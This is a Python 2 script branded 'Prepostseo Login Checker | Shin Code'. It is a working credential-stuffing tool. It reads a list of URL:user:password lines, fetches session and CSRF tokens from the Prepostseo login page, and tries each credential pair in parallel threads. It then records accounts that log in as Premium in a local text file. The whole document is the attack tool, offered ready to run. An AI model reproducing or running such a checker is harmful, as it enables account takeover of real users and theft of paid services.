import requests
import re
from urlparse import urlparse
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

red = Fore.RED
yellow = Fore.YELLOW
reset = Fore.RESET
green = Fore.GREEN
cyan = Fore.CYAN

def get_cookies(base_url, retries=5, timeout=15):
    ses = requests.session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    attempt = 0
    while attempt < retries:
        try:
            response = ses.get(base_url + '/login', headers=headers, timeout=timeout)
            print(yellow + '[*] Wait Get Cookie ....' + reset)
            set_cookie_headers = response.headers.get('Set-Cookie', '').split(',')
            xsrf_token, session_cookie = None, None

            for cookie in set_cookie_headers:
                if 'XSRF-TOKEN' in cookie:
                    xsrf_token = cookie.split('=')[1].split(';')[0]
                elif 'prepostseocom_session' in cookie:
                    session_cookie = cookie.split('=')[1].split(';')[0]

            time.sleep(3)
            return xsrf_token, session_cookie, headers, ses
        except requests.exceptions.Timeout:
            print(red + "Request timed out while fetching cookies. Retrying..." + reset)
            attempt += 1
            time.sleep(5)
        except Exception as e:
            print(red + "Error fetching cookies:" + reset + str(e))
            return None, None, None, None
    
    print(red + "Failed to fetch cookies after retries for " + reset + base_url)
    return None, None, None, None

def login(xsrf_token, session_cookie, headers, base_url, ses, user, passwd, retries=3):
    attempt = 0
    while attempt < retries:
        try:
            if not xsrf_token or not session_cookie:
                print(red + "Missing tokens, cannot proceed." + reset)
                return
            
            cookies = {
                'XSRF-TOKEN': xsrf_token,
                'prepostseocom_session': session_cookie
            }

            response = ses.get(base_url + '/login', headers=headers, cookies=cookies, timeout=10).content
            print(yellow + '[*] Wait Get Token ....' + reset)
            regex = re.findall('<input type="hidden" name="_token" value="(.*?)">', response)

            if regex:
                token = regex[0]
                data = {
                    '_token': token,
                    'email': user,
                    'password': passwd
                }

                login_response = ses.post(base_url + '/emd/login/web', headers=headers, cookies=cookies, data=data, timeout=10)
                print(yellow + '[*] Process Login....' + reset)
                if '{"status":true,"mess":"Successfully Login"}' in login_response.text:
                    print(yellow + '[*] Success Login....' + reset)
                    account_response = ses.get(base_url + '/account', headers=headers, timeout=10)
                    regex = re.findall('<span class="label label-danger white pull-left">(.*?)</span>', account_response.content)
                    print(yellow + '[-]' + base_url + ':' + user + ':' + passwd + " => " + reset + green + str(regex[0]) + reset)
                    print('\n-------------------------------')
                    if 'Premium' in regex:
                        print('[=] Saved Premium Account')
                        open('Prepos_.txt', 'a').write('\n--------Premium---------\n' + base_url + '/login' + '|' + user + '|' + passwd + '\n-----------------\n')
                    else:
                        print('[=] Its Free Account')
                else:
                    print(red + '[x] BAD Login....' + reset)
                    print('\n-------------------------------')
            else:
                print(red + "CSRF token not found." + reset)
                
            attempt += 1
            time.sleep(2)

        except requests.exceptions.Timeout:
            print(red + "Request timed out during login attempt. Retrying..." + reset)
            attempt += 1
            time.sleep(2)
        except Exception as e:
            print(red + "An error occurred:" + reset + str(e))
            return

def process_line(line):
    parts = line.split(':')
    if len(parts) < 3:
        print(red + "Invalid format in line, skipping:" + reset + line)
        return

    base_url = "https://" + urlparse(line).netloc
    user = parts[2]
    passwd = parts[3]
    print(yellow + "\n[+] Base URL:" + reset + base_url)
    print(yellow + "[+] User:" + reset + user)
    print(yellow + "[+] Password:" + reset + passwd)

    xsrf_token, session_cookie, headers, ses = get_cookies(base_url)
    if xsrf_token and session_cookie:
        login(xsrf_token, session_cookie, headers, base_url, ses, user, passwd)
    else:
        print(red + "Failed to fetch cookies for " + reset + base_url)

    time.sleep(3)

def process_list(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.read().splitlines()
            with ThreadPoolExecutor(max_workers=2) as executor:
                futures = [executor.submit(process_line, line) for line in lines]
                for future in as_completed(futures):
                    future.result()
    except IOError:
        print(red + "File not found. Please check the path and try again." + reset)
    except Exception as e:
        print(red + "An error occurred while processing the file:" + str(e) + reset)

print("{}\nPrepostseo Login Checker | {}Shin Code\n".format(yellow, cyan))
file_path = raw_input('\nEnter the path to your list file: ')
process_list(file_path)
